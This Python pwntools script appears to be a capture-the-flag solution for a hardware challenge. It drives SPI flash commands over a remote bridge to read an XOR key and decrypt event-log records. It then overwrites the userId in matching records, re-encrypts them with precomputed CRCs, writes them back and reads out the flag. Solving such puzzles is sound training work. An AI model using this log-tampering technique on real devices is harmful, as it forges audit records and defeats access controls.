from pwn import *
import socket
import json

server = "nc 94.237.57.155 58163"
server = server.split()

s = remote(server[1], server[2])

FLAG_ADDRESS = [0x52, 0x52, 0x52]

crc_list = [[0x20, 0xe4, 0xca, 0x0d], [0x03, 0xd7, 0x27, 0x45], [0x69,0x12, 0xe1, 0x58], [0x3e, 0x24, 0x7e, 0xa4]]

'''
dcae420
4527d703
58e11269
a47e243e
'''


def erase_mem():
    exchange([0x06]) # Write Enable
    exchange([0x20, 0x00, 0x00, 0x00])

def program_pages(original):
    for i in range(0, 0x9c0, 0x100):
        exchange([0x06]) # Write Enable
        exchange([0x02, 0x00, 0x00+(i>>8), 0x00]+original[i:i+0x100])

def erase_only_specific():
    original = exchange([0x03, 0x00, 0x00, 0x00], 2496)
    erase_mem()
    program_pages(original)
    original = exchange([0x03, 0x00, 0x00, 0x00], 2496)

def decrypt_data(data,j,on):
    edit = [data[i] ^ key[i] for i in range(12)]
    if on:
        return edit + crc_list[j/16]
    if not on:
        return edit + data[12:]

def write_payload(pay, i):
    exchange([0x06]) # Write Enable
    exchange([0x02, 0x00, 0x09, 0xc0+i]+pay) 
#    print("write_payload : ")
#    print(pay)

def prettify(data):
    timestamp = (data[3] << 24) + (data[2] << 16) + (data[1] << 8) + data[0]
    eventType = data[4] #data[5] is NULL
    userId = (data[7] << 8) + data[6]
    method = data[8] 
    status = data[9]
    # data[10] and data[11] is for padding bytes.
    crc = (data[15] << 24) + (data[14] << 16) + (data[13] << 8) + data[12]
    print("_______________")
    print("timestamp : " + str(hex(timestamp)))
    print("eventType : " + str(hex(eventType)))
    print("userId : " + str(hex(userId)))
    print("method : " + str(hex(method)))
    print("status : " + str(hex(status)))
    print("crc : " + str(hex(crc)))
    return userId
    
def encrypt_data(data):
    encrypt = [data[i] ^ key[i] for i in range(12)]
    encrypt += data[12:]
    return encrypt

def exchange(hex_list, value=1):

    # Configure according to your setup
    cs=0 # /CS on A*BUS3 (range: A*BUS3 to A*BUS7)
    
    usb_device_url = 'ftdi://ftdi:2232h/1'

    # Convert hex list to strings and prepare the command data
    command_data = {
        "tool": "pyftdi",
        "cs_pin":  cs,
        "url":  usb_device_url,
        "data_out": [hex(x) for x in hex_list],  # Convert hex numbers to hex strings
        "readlen": value
    }
    
    # Serialize data to JSON and send
    s.send(json.dumps(command_data).encode('utf-8'))
    
    # Receive and process response
    data = b''
    while True:
        data += s.recv(1024)
        if data.endswith(b']'):
            break
            
    response = json.loads(data.decode('utf-8'))
    #print(f"Received: {response}")

    return response


# Example command
data = exchange([0x48, 0x00, 0x10, 0x52, 0x00], 12)
key = data
data = exchange([0x03, 0x00, 0x09, 0xc0], 200-80)

erase_only_specific()

for i in range(0, len(data)-60,16):
    payload = decrypt_data(data[i:i+16], i, 1)
#    print(payload)

    payload_ = decrypt_data(data[i:i+16], i, 0)
#    print(payload_ )

    print("BEFORE : ")
    userId = prettify(payload_)

    if(userId == 0x5244):
        payload[7] = 0x3
        payload[6] = 0xa0
        enc_payload = encrypt_data(payload)
        write_payload(enc_payload, i)
        check = exchange([0x03, 0x00, 0x09, 0xc0+i], 16)
        check = decrypt_data(check, i,0)
        print("AFTER : ")
        prettify(check)
#        print(check)

data = exchange([0x03, 0x52, 0x52, 0x52], 100)
flag = ''.join(chr(x) for x in data if data != 255)
print(flag)
